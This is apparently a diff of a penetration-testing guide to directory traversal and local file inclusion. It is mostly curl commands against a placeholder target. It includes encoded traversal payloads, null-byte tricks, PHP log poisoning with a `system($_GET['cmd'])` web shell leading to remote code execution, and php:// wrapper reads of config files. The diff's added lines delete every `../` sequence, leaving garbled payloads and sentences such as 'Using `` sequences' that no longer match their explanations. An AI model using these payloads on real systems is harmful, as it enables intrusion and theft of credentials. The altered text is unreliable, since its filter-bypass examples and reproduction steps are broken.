@@ -52,7 +52,7 @@ Find application endpoints that reference files through parameters.
 curl -s "https://target.example.com/download?file=report.pdf" -o /dev/null -w "%{http_code} %{size_download}"
 
 # Try referencing a file that shouldn't be accessible
-curl -s "https://target.example.com/download?file=../../../etc/passwd"
+curl -s "https://target.example.com/download?file=etc/passwd"
 ```
 
 ### Step 2: Test Basic Directory Traversal Payloads
@@ -62,15 +62,15 @@ Attempt to escape the intended directory and read sensitive files.
 ```bash
 # Linux traversal payloads
 PAYLOADS=(
-  "../../../etc/passwd"
-  "../../../../etc/passwd"
-  "../../../../../etc/passwd"
-  "../../../../../../etc/passwd"
-  "../../../../../../../etc/passwd"
+  "etc/passwd"
+  "etc/passwd"
+  "etc/passwd"
+  "etc/passwd"
+  "etc/passwd"
   "..%2f..%2f..%2fetc%2fpasswd"
   "..%252f..%252f..%252fetc%252fpasswd"
   "%2e%2e/%2e%2e/%2e%2e/etc/passwd"
-  "....//....//....//etc/passwd"
+  "......etc/passwd"
   "..;/..;/..;/etc/passwd"
 )
 
@@ -114,11 +114,11 @@ curl -s "https://target.example.com/download?file=%252e%252e%252f%252e%252e%252f
 curl -s "https://target.example.com/download?file=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
 
 # Null byte injection (PHP < 5.3.4)
-curl -s "https://target.example.com/download?file=../../../etc/passwd%00.pdf"
+curl -s "https://target.example.com/download?file=etc/passwd%00.pdf"
 
 # Path truncation (Windows)
 # Exceeding MAX_PATH (260 chars) to bypass extension checks
-LONG_PATH="../../../etc/passwd"
+LONG_PATH="etc/passwd"
 for i in $(seq 1 200); do LONG_PATH="${LONG_PATH}/."; done
 curl -s "https://target.example.com/download?file=$LONG_PATH"
 
@@ -126,8 +126,8 @@ curl -s "https://target.example.com/download?file=$LONG_PATH"
 curl -s "https://target.example.com/download?file=..\..\..\..\WiNdOwS\win.ini"
 
 # Dot-dot-slash variations
-curl -s "https://target.example.com/download?file=....//....//....//etc/passwd"
-curl -s "https://target.example.com/download?file=....//../../../etc/passwd"
+curl -s "https://target.example.com/download?file=......etc/passwd"
+curl -s "https://target.example.com/download?file=..etc/passwd"
 
 # Using absolute path (if filter only blocks relative traversal)
 curl -s "https://target.example.com/download?file=/etc/passwd"
@@ -172,7 +172,7 @@ curl -s -A "<?php system(\$_GET['cmd']); ?>" \
   "https://target.example.com/"
 
 # Step 2: Include the log file via LFI
-curl -s "https://target.example.com/page?file=../../../var/log/apache2/access.log&cmd=id"
+curl -s "https://target.example.com/page?file=var/log/apache2/access.log&cmd=id"
 
 # PHP wrapper for file read (base64 encode to avoid parsing)
 curl -s "https://target.example.com/page?file=php://filter/convert.base64-encode/resource=config.php"
@@ -187,7 +187,7 @@ curl -s "https://target.example.com/page?file=data://text/plain;base64,PD9waHAgc
 
 # Include /proc/self/environ (if readable)
 curl -s -A "<?php phpinfo(); ?>" \
-  "https://target.example.com/page?file=../../../proc/self/environ"
+  "https://target.example.com/page?file=proc/self/environ"
 
 # Session file inclusion
 # Write PHP code into session via another parameter
@@ -217,7 +217,7 @@ HIGH_VALUE_LINUX=(
 )
 
 for file in "${HIGH_VALUE_LINUX[@]}"; do
-  traversal="../../../../../../..$file"
+  traversal="..$file"
   echo -n "$file: "
   response=$(curl -s "https://target.example.com/download?file=$traversal")
   if [ ${#response} -gt 10 ]; then
@@ -242,7 +242,7 @@ HIGH_VALUE_WIN=(
 
 | Concept | Description |
 |---------|-------------|
-| **Directory Traversal** | Using `../` sequences to navigate to parent directories and access files outside the intended path |
+| **Directory Traversal** | Using `` sequences to navigate to parent directories and access files outside the intended path |
 | **Local File Inclusion (LFI)** | Server-side inclusion of local files, potentially leading to code execution |
 | **Remote File Inclusion (RFI)** | Including files from external URLs (requires `allow_url_include=On` in PHP) |
 | **Null Byte Injection** | Using `%00` to truncate file paths, bypassing extension checks in older PHP versions |
@@ -264,13 +264,13 @@ HIGH_VALUE_WIN=(
 ## Common Scenarios
 
 ### Scenario 1: File Download Traversal
-A document download endpoint at `/download?file=report.pdf` does not validate the file parameter. Replacing the value with `../../../etc/passwd` returns the server's password file.
+A document download endpoint at `/download?file=report.pdf` does not validate the file parameter. Replacing the value with `etc/passwd` returns the server's password file.
 
 ### Scenario 2: Template LFI to RCE
 A PHP application includes templates via `?page=home`. By poisoning the Apache access log with PHP code in the User-Agent header, then including the log file, the attacker achieves remote code execution.
 
 ### Scenario 3: Image Path Traversal
-An image resizing service accepts `?src=images/photo.jpg`. The application strips `../` once but does not recurse, so `....//....//etc/passwd` bypasses the filter.
+An image resizing service accepts `?src=images/photo.jpg`. The application strips `` once but does not recurse, so `....etc/passwd` bypasses the filter.
 
 ### Scenario 4: Windows IIS Configuration Leak
 A .NET application serves files via `?path=docs\manual.pdf`. Traversing to `..\..\web.config` exposes the IIS configuration file containing database connection strings.
@@ -282,12 +282,12 @@ A .NET application serves files via `?path=docs\manual.pdf`. Traversing to `..\.
 
 **Vulnerability**: Path Traversal / Local File Inclusion
 **Severity**: High (CVSS 8.6)
-**Location**: GET /download?file=../../../etc/passwd
+**Location**: GET /download?file=etc/passwd
 **OWASP Category**: A01:2021 - Broken Access Control
 
 ### Reproduction Steps
 1. Navigate to https://target.example.com/download?file=report.pdf
-2. Replace file parameter: ?file=../../../etc/passwd
+2. Replace file parameter: ?file=etc/passwd
 3. Server returns contents of /etc/passwd
 
 ### Files Retrieved
@@ -299,7 +299,7 @@ A .NET application serves files via `?path=docs\manual.pdf`. Traversing to `..\.
 | /proc/self/environ | Environment variables with API keys |
 
 ### Filter Bypass Required
-Original `../` stripped by filter. Successful bypass: `....//....//....//etc/passwd`
+Original `` stripped by filter. Successful bypass: `......etc/passwd`
 
 ### Recommendation
 1. Use an allowlist of permitted file names rather than accepting arbitrary paths
